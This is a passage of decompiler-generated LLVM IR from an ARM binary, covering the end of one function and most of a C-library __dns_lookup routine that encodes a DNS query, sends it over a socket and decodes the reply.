  br i1 %v2_cdac, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_cdac
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_cdac
  %v2_cdb4 = and i32 %v5_cd9c, ptrtoint (i32* @global_var_ff00.82 to i32)
  %v2_cdb0 = udiv i32 %v5_cd9c, 256
  %v4_cdb8 = and i32 %v2_cdb0, 65280
  %v4_cdbc = mul i32 %v2_cdb4, 256
  %v5_cdc0 = udiv i32 %v5_cd9c, 16777216
  %v6_cdc0 = or i32 %v4_cdb8, %v5_cdc0
  %v5_cdc4 = mul i32 %v0_cd9c, 16777216
  %v6_cdc4 = or i32 %v4_cdbc, %v5_cdc4
  %v3_cdc8 = or i32 %v6_cdc0, %v6_cdc4
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_cdd4 = inttoptr i32 %arg2 to i32*
  store i32 %v3_cdc8, i32* %v3_cdd4, align 4
  %v2_cdd8.pre = load i32, i32* %stack_var_-20, align 4
  %v17_cdd8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_cdd8 = phi i32 [ 1, %bb ], [ %v17_cdd8.pre, %bb41 ]
  %v2_cdd8 = phi i32 [ %v3_cd00, %bb ], [ %v2_cdd8.pre, %bb41 ]
  store i32 %v2_cdd8, i32* @r4, align 4
  ret i32 %v17_cdd8

dec_label_pc_cddc:                                ; preds = %dec_label_pc_cd78, %dec_label_pc_cd94, %dec_label_pc_cd18, %dec_label_pc_cd38, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_cd00, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_cd1c.pre, { 2, 1, 0 }
  uselistorder i32 %v1_cda0, { 1, 0 }
  uselistorder i32 %v0_cd8c, { 0, 1, 3, 2 }
  uselistorder i32 %v3_cd00, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 8, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.82 to i32), { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cddc, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_cd50, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_cde8 = load i32, i32* @r4, align 4
  %v6_cde8 = load i32, i32* @r5, align 4
  %v9_cde8 = load i32, i32* @r6, align 4
  %v12_cde8 = load i32, i32* @r7, align 4
  %v15_cde8 = load i32, i32* @r8, align 4
  %v18_cde8 = load i32, i32* @sb, align 4
  %v21_cde8 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_ce08 = call i32 @malloc(i32 512)
  store i32 %v1_ce08, i32* @r7, align 4
  %v1_ce14 = call i32 @malloc(i32 1025)
  %v2_ce18 = icmp eq i32 %v1_ce14, 0
  br i1 %v2_ce18, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_ce1c = load i32, i32* @r7, align 4
  %v3_ce1c = icmp eq i32 %v1_ce1c, 0
  store i32 %v1_ce14, i32* %stack_var_-236, align 4
  br i1 %v3_ce1c, label %bb195, label %dec_label_pc_ce30

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_d510

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_d510

dec_label_pc_ce30:                                ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_ce34 = icmp eq i32 %arg3, 0
  br i1 %v2_ce34, label %dec_label_pc_d510, label %dec_label_pc_ce3c

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_ce30
  %v2_ce40 = load i8, i8* %arg1, align 1
  %v2_ce44 = icmp eq i8 %v2_ce40, 0
  br i1 %v2_ce44, label %dec_label_pc_d510, label %dec_label_pc_ce4c

dec_label_pc_ce4c:                                ; preds = %dec_label_pc_ce3c
  %v3_ce50 = call i32 @strlen(i8* nonnull %arg1)
  %v2_ce58 = add i32 %v3_ce50, %tmp
  %v1_ce5c = add i32 %v2_ce58, -1
  %v2_ce5c = inttoptr i32 %v1_ce5c to i8*
  %v3_ce5c = load i8, i8* %v2_ce5c, align 1
  %v2_ce60 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_ce60, i32* @r4, align 4
  %v7_ce64 = icmp eq i8 %v3_ce5c, 46
  %. = zext i1 %v7_ce64 to i32
  store i32 %v2_ce60, i32* @r0, align 4
  %v1_ce88 = call i32 @__pthread_return_void()
  %v1_ce98 = call i32 @__pthread_return_0()
  %v2_cea4 = load i32, i32* @global_var_1bae8.226, align 4
  %v2_cea8 = srem i32 %v2_cea4, %arg3
  %v3_ceb0 = load i8, i8* @global_var_1b711.229, align 1
  %v4_ceb0 = zext i8 %v3_ceb0 to i32
  %v2_ceb4 = load i8, i8* bitcast (i8** @global_var_1b710.228 to i8*), align 4
  %v3_ceb4 = zext i8 %v2_ceb4 to i32
  %v4_cebc = mul nuw nsw i32 %v4_ceb0, 256
  %v5_cebc = or i32 %v3_ceb4, %v4_cebc
  store i32 %v5_cebc, i32* @sb, align 4
  store i32 %v2_cea8, i32* @sl, align 4
  store i32 %v2_ce60, i32* @r0, align 4
  %v1_ced0 = call i32 @__pthread_return_void()
  %v0_cedc = load i32, i32* @r5, align 4
  %v2_cefc = ptrtoint i8* %stack_var_-188 to i32
  %v6_cf40 = bitcast i8* %stack_var_-188 to i32*
  %v2_d020 = ptrtoint i32* %stack_var_-92 to i32
  %v3_d0b8 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_d11c = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_d468 = icmp eq i1 %v7_ce64, false
  %v7_d170 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_d254 = ptrtoint i32* %stack_var_-140 to i32
  %v9_d34c = icmp eq i32 %tmp147, %arg2
  %v7_d2e0 = icmp eq i32 %arg2, 1
  %v2_d288 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_cedc, 3
  br i1 %tmp292, label %dec_label_pc_cee4.lr.ph.preheader.lr.ph, label %dec_label_pc_d51c

dec_label_pc_cee4.lr.ph.preheader.lr.ph:          ; preds = %dec_label_pc_ce4c
  %v2_d1f4 = icmp eq i32 %tmp156, 0
  %v8_d2e4 = icmp eq i32 %arg2, 28
  br label %dec_label_pc_cee4.lr.ph.preheader

dec_label_pc_cee4:                                ; preds = %dec_label_pc_cee4.lr.ph, %dec_label_pc_d500.backedge
  %v1_ceec = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_cee4.lr.ph ], [ %v0_d094, %dec_label_pc_d500.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_cee4.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_d500.backedge ]
  %v7_cee8 = icmp eq i32 %v1_ceec, -1
  br i1 %v7_cee8, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_cee4
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_cee4, %bb199
  %v1_cef0 = xor i1 %v7_cee8, true
  call void @__pseudo_cond_branch(i1 %v1_cef0, i32 ptrtoint (i32* @global_var_a8c0.231 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_cefc, i32* @r4, align 4
  %v0_cf00 = load i32, i32* @r7, align 4
  %v2_cf04 = inttoptr i32 %v0_cf00 to i8*
  %v3_cf04 = call i32 @__GI_memset(i8* %v2_cf04, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_cf14 = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_cf18 = load i32, i32* @sb, align 4
  %v1_cf18 = add i32 %v0_cf18, 1
  %v3_cf20 = urem i32 %v1_cf18, 65536
  store i32 %v3_cf20, i32* @sb, align 4
  %v0_cf2c = load i32, i32* @r7, align 4
  %v5_cf38 = trunc i32 %v1_cf18 to i8
  store i8 %v5_cf38, i8* %stack_var_-188, align 1
  %v7_cf40 = call i32 @__encode_header(i32* %v6_cf40, i32 %v0_cf2c, i32 512, i32 1, i32 %v1_cf18)
  store i32 %v7_cf40, i32* @r5, align 4
  %v1_cf44 = icmp slt i32 %v7_cf40, 0
  br i1 %v1_cf44, label %dec_label_pc_d51c, label %dec_label_pc_cf4c

dec_label_pc_cf4c:                                ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_cf54 = load i32, i32* %stack_var_-236, align 4
  %v4_cf58 = call i32 @strncpy(i32 %v2_cf54, i32 %tmp, i32 1025)
  store i32 %v2_ce60, i32* @r0, align 4
  %v1_cf70 = call i32 @__pthread_return_void()
  %v1_cf80 = call i32 @__pthread_return_0()
  %v1_cf90 = load i32, i32* @sl, align 4
  %v4_cf90 = mul i32 %v1_cf90, 4
  %v5_cf90 = add i32 %v4_cf90, %arg4
  %v6_cf90 = inttoptr i32 %v5_cf90 to i32*
  %v7_cf90 = load i32, i32* %v6_cf90, align 4
  store i32 %v7_cf90, i32* @r6, align 4
  br i1 %v1_cf8c, label %dec_label_pc_cfd4, label %dec_label_pc_cf98

dec_label_pc_cf98:                                ; preds = %dec_label_pc_cf4c
  %v2_cfa0 = load i32, i32* @global_var_1dbb8.234, align 4
  %v6_cfa8 = icmp slt i32 %v6_d4c4, %v2_cfa0
  br i1 %v6_cfa8, label %dec_label_pc_cfac, label %dec_label_pc_cfd4

dec_label_pc_cfac:                                ; preds = %dec_label_pc_cf98
  store i32 ptrtoint (i32* @global_var_124bc.236 to i32), i32* @r1, align 4
  %v2_cfb4 = load i32, i32* %stack_var_-236, align 4
  %v4_cfb8 = inttoptr i32 %v2_cfb4 to i8*
  %v5_cfb8 = call i32 @__GI_strncat(i8* %v4_cfb8, i32 ptrtoint (i32* @global_var_124bc.236 to i32), i32 1025, i32 %v2_cfa0)
  %v7_cfc8 = load i32, i32* %v6_cfc8, align 4
  store i32 %v7_cfc8, i32* @r1, align 4
  %v4_cfd0 = inttoptr i32 %v2_cfb4 to i8*
  %v5_cfd0 = call i32 @__GI_strncat(i8* %v4_cfd0, i32 %v7_cfc8, i32 1025, i32 ptrtoint (i32* @global_var_1db98.238 to i32))
  br label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_cf98, %dec_label_pc_cf4c, %dec_label_pc_cfac
  store i32 %v2_ce60, i32* @r0, align 4
  store i32 53224, i32* @lr, align 4
  %v1_cfe4 = call i32 @__pthread_return_void()
  %v2_cff0 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_cff0, i32* %stack_var_-56, align 4
  %v0_d000 = load i32, i32* @r7, align 4
  %v1_d000 = load i32, i32* @r5, align 4
  %v2_d000 = add i32 %v1_d000, %v0_d000
  %v1_d004 = sub i32 512, %v1_d000
  %v8_d00c = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_d000, i32 %v1_d004, i32 %arg2, i32 %v2_cff0, i32 %arg2, i32 1)
  store i32 %v8_d00c, i32* @fp, align 4
  %v1_d010 = icmp slt i32 %v8_d00c, 0
  br i1 %v1_d010, label %dec_label_pc_d51c, label %dec_label_pc_d018

dec_label_pc_d018:                                ; preds = %dec_label_pc_cfd4
  store i32 0, i32* @r4, align 4
  %v0_d028 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_d034 = inttoptr i32 %v0_d028 to i8*
  %v4_d034 = call i32 @inet_pton(i32 10, i8* %v3_d034, i32 %v2_d020)
  %v1_d038 = load i32, i32* @r4, align 4
  %v7_d03c = icmp sgt i32 %v4_d034, %v1_d038
  br i1 %v7_d03c, label %bb201, label %dec_label_pc_d018..thread11_crit_edge

dec_label_pc_d018..thread11_crit_edge:            ; preds = %dec_label_pc_d018
  %v3_d048.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_d018
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_d018..thread11_crit_edge, %bb201
  %v3_d048 = phi i8 [ %v3_d048.pre, %dec_label_pc_d018..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_d048 = sext i8 %v3_d048 to i32
  %v8_d044.op = urem i32 %v1_d038, 256
  %v8_d044.op.op = mul nuw nsw i32 %v8_d044.op, 256
  %v4_d050 = select i1 %v7_d03c, i32 %v8_d044.op.op, i32 0
  %v5_d050 = or i32 %v4_d048, %v4_d050
  %v7_d054 = icmp eq i32 %v5_d050, 10
  br i1 %v7_d054, label %dec_label_pc_d080, label %dec_label_pc_d068

dec_label_pc_d068:                                ; preds = %.thread11
  %v0_d06c = load i32, i32* @r6, align 4
  store i32 %v0_d06c, i32* @r0, align 4
  %v1_d078 = call i32 @inet_addr(i32 %v0_d06c)
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %.thread11, %dec_label_pc_d068
  %v0_d094 = call i32 @socket()
  %v1_d098 = icmp slt i32 %v0_d094, 0
  br i1 %v1_d098, label %.thread, label %dec_label_pc_d0b0

.thread:                                          ; preds = %dec_label_pc_d080
  br label %dec_label_pc_d500.backedge

dec_label_pc_d500.backedge:                       ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_cee4, label %dec_label_pc_d51c

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d080
  %v4_d0b8 = call i32 @__libc_connect(i32 %v0_d094, %sockaddr* nonnull %v3_d0b8, i32 28)
  %v1_d0bc = icmp slt i32 %v4_d0b8, 0
  br i1 %v1_d0bc, label %dec_label_pc_d0c4, label %dec_label_pc_d0e4

dec_label_pc_d0c4:                                ; preds = %dec_label_pc_d0b0
  %v0_d0c4 = call i32 @__errno_location()
  %v1_d0c8 = inttoptr i32 %v0_d0c4 to i32*
  %v2_d0c8 = load i32, i32* %v1_d0c8, align 4
  %v7_d0cc = icmp eq i32 %v2_d0c8, 101
  br i1 %v7_d0cc, label %dec_label_pc_d430, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_d0c4
  br label %dec_label_pc_d500.backedge

dec_label_pc_d0e4:                                ; preds = %dec_label_pc_d0b0
  %v0_d0e4 = load i32, i32* @r5, align 4
  %v1_d0e4 = load i32, i32* @fp, align 4
  %v2_d0e4 = add i32 %v1_d0e4, %v0_d0e4
  %v0_d0e8 = load i32, i32* @r7, align 4
  %v5_d0f4 = inttoptr i32 %v0_d0e8 to i32*
  %v6_d0f4 = call i32 @__libc_send(i32 %v0_d094, i32* %v5_d0f4, i32 %v2_d0e4, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 0, i32* @r4, align 4
  store i32 %v0_d094, i32* %stack_var_-44, align 4
  %v11_d11c = call i32 @__libc_poll(%pollfd* %v10_d11c, i32 1, i32 10000, i32 1, i32 %v0_d094, i32 1, i32 0)
  %v1_d120 = load i32, i32* @r4, align 4
  %v7_d124 = icmp sgt i32 %v11_d11c, %v1_d120
  br i1 %v7_d124, label %dec_label_pc_d128, label %dec_label_pc_d430

dec_label_pc_d128:                                ; preds = %dec_label_pc_d0e4
  %v0_d130 = load i32, i32* @r7, align 4
  %v5_d138 = inttoptr i32 %v0_d130 to i32*
  %v6_d138 = call i32 @__libc_recv(i32 %v0_d094, i32* %v5_d138, i32 512, i32 %v1_d120, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_d138, i32* @fp, align 4
  %v7_d144 = icmp slt i32 %v6_d138, 12
  br i1 %v7_d144, label %dec_label_pc_d464, label %dec_label_pc_d148

dec_label_pc_d148:                                ; preds = %dec_label_pc_d128
  %v0_d148 = load i32, i32* @r7, align 4
  %v2_d150 = inttoptr i32 %v0_d148 to i8*
  %v3_d150 = call i32 @__decode_header(i8* %v2_d150, i32 %v2_cefc)
  %v3_d154 = load i8, i8* %stack_var_-188, align 1
  %v4_d154 = sext i8 %v3_d154 to i32
  store i32 %v4_d154, i32* @r6, align 4
  %v1_d158 = load i32, i32* @sb, align 4
  %v9_d158 = icmp eq i32 %v4_d154, %v1_d158
  br i1 %v9_d158, label %dec_label_pc_d160, label %dec_label_pc_d464

dec_label_pc_d160:                                ; preds = %dec_label_pc_d148
  %v1_d164 = load i32, i32* @r4, align 4
  %v9_d164 = icmp eq i32 %tmp157, %v1_d164
  br i1 %v9_d164, label %dec_label_pc_d464, label %dec_label_pc_d16c

dec_label_pc_d16c:                                ; preds = %dec_label_pc_d160
  br i1 %v7_d170, label %dec_label_pc_d178, label %dec_label_pc_d1f4

dec_label_pc_d178:                                ; preds = %dec_label_pc_d16c
  %v9_d17c = icmp eq i32 %., %v1_d164
  br i1 %v9_d17c, label %dec_label_pc_d184, label %dec_label_pc_d1e8

dec_label_pc_d184:                                ; preds = %dec_label_pc_d178
  store i32 %v2_ce60, i32* @r5, align 4
  store i32 %v2_ce60, i32* @r0, align 4
  %v1_d19c = call i32 @__pthread_return_void()
  %v1_d1ac = call i32 @__pthread_return_0()
  store i32 %v2_ce60, i32* @r0, align 4
  %v2_d1b8 = load i32, i32* @global_var_1dbb8.234, align 4
  %v1_d1c8 = call i32 @__pthread_return_void()
  %v1_d1d0 = add i32 %v2_d1b8, -1
  store i32 %v1_d1d0, i32* @r4, align 4
  %v5_d1d8 = icmp slt i32 %v6_d4c4, %v1_d1d0
  br i1 %v5_d1d8, label %.thread19, label %dec_label_pc_d1e8

.thread19:                                        ; preds = %dec_label_pc_d184
  %v7_d1d8 = add i32 %v6_d4c4, 1
  %v6_d1dc = load i32, i32* @r6, align 4
  store i32 %v6_d1dc, i32* @sb, align 4
  br label %dec_label_pc_d500.outer.backedge

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d184, %dec_label_pc_d178
  %v0_d1e8 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_d218

dec_label_pc_d1f4:                                ; preds = %dec_label_pc_d16c
  br i1 %v2_d1f4, label %dec_label_pc_d1fc, label %dec_label_pc_d464

dec_label_pc_d1fc:                                ; preds = %dec_label_pc_d1f4
  br i1 %tmp198, label %dec_label_pc_d210, label %dec_label_pc_d228.preheader

dec_label_pc_d228.preheader:                      ; preds = %dec_label_pc_d1fc
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_d228

dec_label_pc_d210:                                ; preds = %dec_label_pc_d1fc
  %v0_d210 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_d218

dec_label_pc_d218:                                ; preds = %dec_label_pc_d1e8, %dec_label_pc_d210
  %storemerge4 = phi i32 [ %v0_d210, %dec_label_pc_d210 ], [ %v0_d1e8, %dec_label_pc_d1e8 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_d210 ], [ 1, %dec_label_pc_d1e8 ]
  %v2_d218 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_d218, align 4
  br label %dec_label_pc_d52c

dec_label_pc_d220:                                ; preds = %dec_label_pc_d228
  %v2_d220 = call i32 @__length_question(i32 %v0_d234, i32 %v0_d230)
  %v0_d224 = load i32, i32* @r5, align 4
  %v2_d224 = add i32 %v0_d224, %v2_d220
  store i32 %v2_d224, i32* @r5, align 4
  %v0_d22c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d228

dec_label_pc_d228:                                ; preds = %dec_label_pc_d228.preheader, %dec_label_pc_d220
  %v0_d230 = phi i32 [ 12, %dec_label_pc_d228.preheader ], [ %v2_d224, %dec_label_pc_d220 ]
  %v0_d238 = phi i32 [ 0, %dec_label_pc_d228.preheader ], [ %v0_d22c.pre, %dec_label_pc_d220 ]
  store i32 %v0_d230, i32* @r1, align 4
  %v0_d234 = load i32, i32* @r7, align 4
  store i32 %v0_d234, i32* @r0, align 4
  %v1_d238 = add i32 %v0_d238, 1
  store i32 %v1_d238, i32* @r4, align 4
  %v5_d23c = icmp slt i32 %v0_d238, 1
  br i1 %v5_d23c, label %dec_label_pc_d220, label %dec_label_pc_d240

dec_label_pc_d240:                                ; preds = %dec_label_pc_d228
  br label %dec_label_pc_d39c

dec_label_pc_d254:                                ; preds = %bb205
  store i32 %v2_d254, i32* @r4, align 4
  %v0_d258 = load i32, i32* @r7, align 4
  %v0_d260 = load i32, i32* @fp, align 4
  %v5_d268 = call i32 @__decode_answer(i32 %v0_d258, i32 %v0_d25c, i32 %v0_d260, i32* nonnull %stack_var_-140)
  %v1_d26c = icmp slt i32 %v5_d268, 0
  br i1 %v1_d26c, label %dec_label_pc_d278, label %dec_label_pc_d294

dec_label_pc_d278:                                ; preds = %dec_label_pc_d254
  %v2_d27c = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_d27c, label %dec_label_pc_d464, label %dec_label_pc_d284

dec_label_pc_d284:                                ; preds = %dec_label_pc_d278
  br i1 %v2_d288, label %dec_label_pc_d464, label %dec_label_pc_d3b0

dec_label_pc_d294:                                ; preds = %dec_label_pc_d254
  %v2_d298 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_d298, label %dec_label_pc_d33c, label %dec_label_pc_d2a0

dec_label_pc_d2a0:                                ; preds = %dec_label_pc_d294
  %v0_d2a0 = load i32, i32* @r8, align 4
  %v6_d2a4 = add i32 %v0_d2a0, 36
  %v7_d2a4 = inttoptr i32 %v6_d2a4 to i32*
  %v8_d2a4 = load i32, i32* %v7_d2a4, align 4
  store i32 %v8_d2a4, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_d254, i32* @r1, align 4
  store i32 %v0_d2a0, i32* @r0, align 4
  %v0_d2c0 = call i32 @memcpy()
  %v0_d2c4 = load i32, i32* @r8, align 4
  %v1_d2c4 = add i32 %v0_d2c4, 4
  %v2_d2c4 = inttoptr i32 %v1_d2c4 to i32*
  %v3_d2c4 = load i32, i32* %v2_d2c4, align 4
  %v7_d2c8 = icmp eq i32 %v3_d2c4, 24
  br i1 %v7_d2c8, label %dec_label_pc_d2ec, label %dec_label_pc_d2d0

dec_label_pc_d2d0:                                ; preds = %dec_label_pc_d2a0
  %v1_d2d0 = add i32 %v0_d2c4, 28
  %v2_d2d0 = inttoptr i32 %v1_d2d0 to i32*
  %v3_d2d0 = load i32, i32* %v2_d2d0, align 4
  %v2_d2d4 = icmp eq i32 %v3_d2d0, 0
  br i1 %v2_d2d4, label %dec_label_pc_d3b0, label %dec_label_pc_d2dc

dec_label_pc_d2dc:                                ; preds = %dec_label_pc_d2d0
  br i1 %v7_d2e0, label %dec_label_pc_d2ec, label %bb203

bb203:                                            ; preds = %dec_label_pc_d2dc
  br i1 %v8_d2e4, label %dec_label_pc_d2ec, label %dec_label_pc_d3b0

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d2dc, %bb203, %dec_label_pc_d2a0
  %v9_d2f0 = icmp eq i32 %v3_d2c4, %arg2
  br i1 %v9_d2f0, label %dec_label_pc_d304, label %dec_label_pc_d2f8

dec_label_pc_d2f8:                                ; preds = %dec_label_pc_d2ec
  %v1_d2f8 = inttoptr i32 %v0_d2c4 to i32*
  %v2_d2f8 = load i32, i32* %v1_d2f8, align 4
  %v1_d2fc = call i32 @free(i32 %v2_d2f8)
  br label %dec_label_pc_d388

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2ec
  %v1_d30c = add i32 %v0_d2c4, 16
  %v2_d30c = inttoptr i32 %v1_d30c to i32*
  %v3_d30c = load i32, i32* %v2_d30c, align 4
  %v2_d310 = sub i32 %tmp155, %stack_var_-192.0
  %v1_d314 = add i32 %v2_d310, -1
  %v1_d318 = add i32 %v3_d30c, 4
  %v2_d31c = mul i32 %v1_d318, %v1_d314
  %v1_d320 = add i32 %v0_d2c4, 32
  %v2_d320 = inttoptr i32 %v1_d320 to i32*
  %v3_d320 = load i32, i32* %v2_d320, align 4
  %v2_d328 = add i32 %v0_d2c4, 36
  %v3_d328 = inttoptr i32 %v2_d328 to i32*
  store i32 %v1_d314, i32* %v3_d328, align 4
  %tmp294 = icmp ugt i32 %v2_d31c, %v3_d320
  br i1 %tmp294, label %dec_label_pc_d3b0, label %dec_label_pc_d304.dec_label_pc_d384_crit_edge

dec_label_pc_d304.dec_label_pc_d384_crit_edge:    ; preds = %dec_label_pc_d304
  %v1_d384.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d384

dec_label_pc_d33c:                                ; preds = %dec_label_pc_d294
  %v3_d33c = load i32, i32* %stack_var_-140, align 4
  %v1_d340 = call i32 @free(i32 %v3_d33c)
  br i1 %v9_d34c, label %dec_label_pc_d354, label %dec_label_pc_d388

dec_label_pc_d354:                                ; preds = %dec_label_pc_d33c
  %v0_d354 = load i32, i32* @r8, align 4
  %v1_d354 = add i32 %v0_d354, 16
  %v2_d354 = inttoptr i32 %v1_d354 to i32*
  %v3_d354 = load i32, i32* %v2_d354, align 4
  %v9_d35c = icmp eq i32 %v3_d354, %tmp146
  br i1 %v9_d35c, label %dec_label_pc_d364, label %dec_label_pc_d45c

dec_label_pc_d364:                                ; preds = %dec_label_pc_d354
  %v1_d364 = add i32 %v0_d354, 36
  %v2_d364 = inttoptr i32 %v1_d364 to i32*
  %v3_d364 = load i32, i32* %v2_d364, align 4
  %v1_d368 = add i32 %v0_d354, 28
  %v2_d368 = inttoptr i32 %v1_d368 to i32*
  %v3_d368 = load i32, i32* %v2_d368, align 4
  %v3_d36c = mul i32 %v3_d364, %tmp146
  %v4_d36c = add i32 %v3_d368, %v3_d36c
  store i32 %v4_d36c, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_d378 = call i32 @memcpy()
  %v0_d37c = load i32, i32* @r8, align 4
  %v1_d37c = add i32 %v0_d37c, 36
  %v2_d37c = inttoptr i32 %v1_d37c to i32*
  %v3_d37c = load i32, i32* %v2_d37c, align 4
  %v1_d380 = add i32 %v3_d37c, 1
  br label %dec_label_pc_d384

dec_label_pc_d384:                                ; preds = %dec_label_pc_d304.dec_label_pc_d384_crit_edge, %dec_label_pc_d364
  %v1_d384 = phi i32 [ %v0_d37c, %dec_label_pc_d364 ], [ %v1_d384.pre, %dec_label_pc_d304.dec_label_pc_d384_crit_edge ]
  %storemerge5 = phi i32 [ %v1_d380, %dec_label_pc_d364 ], [ 0, %dec_label_pc_d304.dec_label_pc_d384_crit_edge ]
  %v2_d384 = add i32 %v1_d384, 36
  %v3_d384 = inttoptr i32 %v2_d384 to i32*
  store i32 %storemerge5, i32* %v3_d384, align 4
  br label %dec_label_pc_d388

dec_label_pc_d388:                                ; preds = %dec_label_pc_d33c, %dec_label_pc_d2f8, %dec_label_pc_d384
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_d384 ], [ 0, %dec_label_pc_d33c ], [ %stack_var_-212.2, %dec_label_pc_d2f8 ]
  %v1_d390 = add i32 %stack_var_-192.0, 1
  %v0_d398 = load i32, i32* @r5, align 4
  %v2_d398 = add i32 %v0_d398, %v5_d268
  store i32 %v2_d398, i32* @r5, align 4
  br label %dec_label_pc_d39c

dec_label_pc_d39c:                                ; preds = %dec_label_pc_d240, %dec_label_pc_d388
  %v0_d25c = phi i32 [ %v0_d230, %dec_label_pc_d240 ], [ %v2_d398, %dec_label_pc_d388 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_d240 ], [ %stack_var_-212.1, %dec_label_pc_d388 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_d240 ], [ %v1_d390, %dec_label_pc_d388 ]
  %v2_d3a4 = sub i32 %stack_var_-192.0, %tmp155
  %v4_d3a4 = xor i32 %stack_var_-192.0, %tmp155
  %v5_d3a4 = xor i32 %v2_d3a4, %stack_var_-192.0
  %v6_d3a4 = and i32 %v5_d3a4, %v4_d3a4
  %v5_d3a8 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_d3a8, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_d39c
  %v7_d3a8 = load i32, i32* @fp, align 4
  %v8_d3a8 = sub i32 %v0_d25c, %v7_d3a8
  %v10_d3a8 = xor i32 %v7_d3a8, %v0_d25c
  %v11_d3a8 = xor i32 %v8_d3a8, %v0_d25c
  %v12_d3a8 = and i32 %v11_d3a8, %v10_d3a8
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_d39c, %bb204
  %v1_d3ac.in = phi i32 [ %v6_d3a4, %dec_label_pc_d39c ], [ %v12_d3a8, %bb204 ]
  %v0_d3ac.in = phi i32 [ %v2_d3a4, %dec_label_pc_d39c ], [ %v8_d3a8, %bb204 ]
  %v0_d3ac = icmp slt i32 %v0_d3ac.in, 0
  %v1_d3ac = icmp slt i32 %v1_d3ac.in, 0
  %v2_d3ac = xor i1 %v1_d3ac, %v0_d3ac
